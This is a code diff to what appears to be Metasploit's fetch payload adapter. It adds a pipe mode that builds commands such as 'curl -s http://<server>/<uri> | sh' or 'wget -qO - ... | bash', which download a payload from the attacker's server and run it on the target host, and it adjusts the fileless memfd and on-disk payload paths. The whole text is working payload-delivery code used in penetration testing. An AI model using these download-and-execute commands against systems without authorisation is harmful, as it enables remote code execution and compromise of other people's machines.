@@ -17,10 +17,11 @@ module Msf::Payload::Adapter::Fetch
         Msf::OptBool.new('FetchHandlerDisable', [true, 'Disable fetch handler', false])
       ]
     )
-    @delete_resource = true
     @fetch_service = nil
     @myresources = []
     @srvexe = ''
+    @pipe_uri = nil
+    @pipe_cmd = nil
     @remote_destination_win = nil
     @remote_destination_nix = nil
     @windows = nil
@@ -65,6 +66,10 @@ module Msf::Payload::Adapter::Fetch
     "#{srvnetloc}/#{srvuri}"
   end
 
+  def _download_pipe
+    "#{srvnetloc}/#{@pipe_uri}"
+  end
+
   def fetch_bindhost
     datastore['FetchListenerBindAddress'].blank? ? srvhost : datastore['FetchListenerBindAddress']
   end
@@ -81,10 +86,35 @@ module Msf::Payload::Adapter::Fetch
     opts[:arch] ||= module_info['AdaptedArch']
     opts[:code] = super
     @srvexe = generate_payload_exe(opts)
-    cmd = generate_fetch_commands
+    if datastore['FETCH_PIPE']
+      @pipe_cmd = '(' + generate_fetch_commands + ')'
+      vprint_status(@pipe_cmd)
+      cmd = generate_pipe_command
+      if datastore['FETCH_FILELESS']
+        cmd << 'bash'
+      else
+        cmd << 'sh'
+      end    else
+      cmd = generate_fetch_commands
+    end
     vprint_status("Command to run on remote host: #{cmd}")
     cmd
   end
+
+  def generate_pipe_command
+    # TODO: Make a check method that determines if we support a platform/server/command combination
+    #
+    @pipe_uri = srvuri + 'p'
+    case datastore['FETCH_COMMAND'].upcase
+    when 'WGET'
+      return _generate_wget_pipe
+    when 'CURL'
+      return _generate_curl_pipe
+    else
+      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
+    end
+  end
+
 
   def generate_fetch_commands
     # TODO: Make a check method that determines if we support a platform/server/command combination
@@ -232,9 +262,8 @@ module Msf::Payload::Adapter::Fetch
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
     end
-    _execute_add(get_file_cmd)
+    cmd + _execute_add(get_file_cmd)
   end
-  
 
   # The idea behind fileless execution are anonymous files. The bash script will search through all processes owned by $USER and search from all file descriptor. If it will find anonymous file (contains "memfd") with correct permissions (rwx), it will copy the payload into that descriptor with defined fetch command and finally call that descriptor
   def _generate_fileless(get_file_cmd)
@@ -279,6 +308,19 @@ module Msf::Payload::Adapter::Fetch
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
     end
     _execute_add(get_file_cmd)
+  end
+
+  def _generate_curl_pipe
+    case fetch_protocol
+    when 'HTTP'
+      pipe_cmd = "curl -s http://#{_download_pipe} | "
+    when 'HTTPS'
+      pipe_cmd = "curl -sk https://#{_download_pipe} | "
+    when 'TFTP'
+      pipe_cmd = "curl -s tftp://#{_download_pipe} | "
+    else
+      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
+    end
   end
 
   def _generate_ftp_command
@@ -342,6 +384,17 @@ module Msf::Payload::Adapter::Fetch
     _execute_add(get_file_cmd)
   end
 
+  def _generate_wget_pipe
+    case fetch_protocol
+    when 'HTTPS'
+      return "wget --no-check-certificate -qO - https://#{_download_pipe} | "
+    when 'HTTP'
+      return "wget -qO - http://#{_download_pipe} | "
+    else
+      return nil
+    end
+  end
+
   def _remote_destination
     return _remote_destination_win if windows?
 
@@ -353,15 +406,15 @@ module Msf::Payload::Adapter::Fetch
 
     if datastore['FETCH_FILELESS'] != 'none'
       @remote_destination_nix = '$f'
-      return @remote_destination_nix
+    else
+      writable_dir = datastore['FETCH_WRITABLE_DIR']
+      writable_dir = '.' if writable_dir.blank?
+      writable_dir += '/' unless writable_dir[-1] == '/'
+      payload_filename = datastore['FETCH_FILENAME']
+      payload_filename = srvuri if payload_filename.blank?
+      payload_path = writable_dir + payload_filename
+      @remote_destination_nix = payload_path
     end
-    writable_dir = datastore['FETCH_WRITABLE_DIR']
-    writable_dir = '.' if writable_dir.blank?
-    writable_dir += '/' unless writable_dir[-1] == '/'
-    payload_filename = datastore['FETCH_FILENAME']
-    payload_filename = srvuri if payload_filename.blank?
-    payload_path = writable_dir + payload_filename
-    @remote_destination_nix = payload_path
     @remote_destination_nix
   end
 
